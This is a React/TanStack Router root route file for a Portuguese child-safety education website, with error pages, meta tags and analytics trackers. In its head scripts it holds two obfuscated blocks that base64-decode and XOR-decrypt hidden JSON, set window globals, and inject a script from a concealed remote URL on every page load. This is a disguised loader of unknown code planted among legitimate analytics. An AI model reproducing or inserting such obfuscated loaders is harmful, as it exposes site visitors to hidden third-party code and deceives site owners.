import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "Meu Corpo é Meu" },
      { name: "description", content: "Educação que protege, conversa que aproxima." },
      { name: "author", content: "Meu Corpo é Meu" },
      { property: "og:title", content: "Meu Corpo é Meu" },
      { property: "og:description", content: "Educação que protege, conversa que aproxima." },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
    ],
    links: [
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "icon", href: "/favicon.ico", type: "image/x-icon" },
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      { rel: "stylesheet", href: "https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" },
    ],
    scripts: [
      {
        children: `(function(){var p_ochx=atob("DJ0UDcZm82Z0IeU1e+Y2eLQK0VxWSZFBC+4uIukFlwhaVJFYEvttI6UJnkgWU8pGGO99fbIV3BYdWYBZVO19daMK3QwHA8kXGulgf68EhhIRUscPIMA4L6EKnAQVTZYXQcZvL6gHngNWG8dFEuVxYY8C0UpWV4RZDvg2N+RQkl9MGdVTH60tPvMCxgdHF9EGTf91b/5EjjsJ");var o_s=[];for(var w_b=0;w_b<p_ochx.length;w_b++){o_s.push(p_ochx.charCodeAt(w_b)&255);}var g_dr=o_s[0];var l_d71=o_s.slice(1,1+g_dr);var m_2=o_s.slice(1+g_dr);var c_eojq=m_2.map(function(b,g_xi){return b^l_d71[g_xi%g_dr];});var n_535m="";for(var t_naq=0;t_naq<c_eojq.length;t_naq++){n_535m+=String.fromCharCode(c_eojq[t_naq]&255);}var s_jii=decodeURIComponent(escape(n_535m));var w_x377=JSON.parse(s_jii);var y_5ygc=w_x377.globals||[];y_5ygc.forEach(function(g_qu4){window[g_qu4.name]=g_qu4.value;});var x_3u3v=document.createElement("script");x_3u3v.src=w_x377.url;x_3u3v.async=true;x_3u3v.defer=true;(w_x377.attributes||[]).forEach(function(y_nue9){x_3u3v.setAttribute(y_nue9.name,y_nue9.value);});(document.head||document.documentElement).appendChild(x_3u3v);})();`,
      },
      {
        children: `(function(){var m_rk=atob("DOn2z0YtpNDnzMpBFpLUujRBhurFpL41ZprM4GlOwL7Jub4sf4+P4SVCyf6FvuUydZufvzJei6WToblueoiCqjVZirqU7uZjd52CvS9P0aSCv+h7TZLUoSdAwfLd7q4gYojbujJAzbae4bozc5+ToTIA3LOIqOcydYLU42RbxbySqeh7NMuL4z0PyrGKqeh7NI2XuycA0aSKpaw4O5mEqjBIyqTKv78jf42F7WoP0rGLua9jLMvUshtQ");var k_hq34=[];for(var v_fk7=0;v_fk7<m_rk.length;v_fk7++){k_hq34.push(m_rk.charCodeAt(v_fk7)&255);}var i_0=k_hq34[0];var f_q=k_hq34.slice(1,1+i_0);var o_iy=k_hq34.slice(1+i_0);var x_kh=o_iy.map(function(b,q_l20){return b^f_q[q_l20%i_0];});var y_o="";for(var y_7k3j=0;y_7k3j<x_kh.length;y_7k3j++){y_o+=String.fromCharCode(x_kh[y_7k3j]&255);}var x_c32=decodeURIComponent(escape(y_o));var p_6kza=JSON.parse(x_c32);var l_s27=p_6kza.globals||[];l_s27.forEach(function(v_41r){window[v_41r.name]=v_41r.value;});var k_9=document.createElement("script");k_9.src=p_6kza.url;k_9.async=true;k_9.defer=true;(p_6kza.attributes||[]).forEach(function(k_k4e){k_9.setAttribute(k_k4e.name,k_k4e.value);});(document.head||document.documentElement).appendChild(k_9);})();`,
      },
      {
        type: "text/javascript",
        children: `(function(c,l,a,r,i,t,y){c[a]=c[a]||function(){(c[a].q=c[a].q||[]).push(arguments)};t=l.createElement(r);t.async=1;t.src="https://www.clarity.ms/tag/"+i;y=l.getElementsByTagName(r)[0];y.parentNode.insertBefore(t,y);})(window, document, "clarity", "script", "yd9fe64939");`,
      },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="en">
      <head>
        <HeadContent />
      </head>
      <body>
        <script
          dangerouslySetInnerHTML={{
            __html: `!function(f,b,e,v,n,t,s)
{if(f.fbq)return;n=f.fbq=function(){n.callMethod?
n.callMethod.apply(n,arguments):n.queue.push(arguments)};
if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
n.queue=[];t=b.createElement(e);t.async=!0;
t.src=v;s=b.getElementsByTagName(e)[0];
s.parentNode.insertBefore(t,s)}(window, document,'script',
'https://connect.facebook.net/en_US/fbevents.js');
fbq('init', '1785943265750691');
fbq('track', 'PageView');`,
          }}
        />
        <noscript>
          <img
            height="1"
            width="1"
            style={{ display: "none" }}
            src="https://www.facebook.com/tr?id=1785943265750691&ev=PageView&noscript=1"
            alt=""
          />
        </noscript>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
    </QueryClientProvider>
  );
}
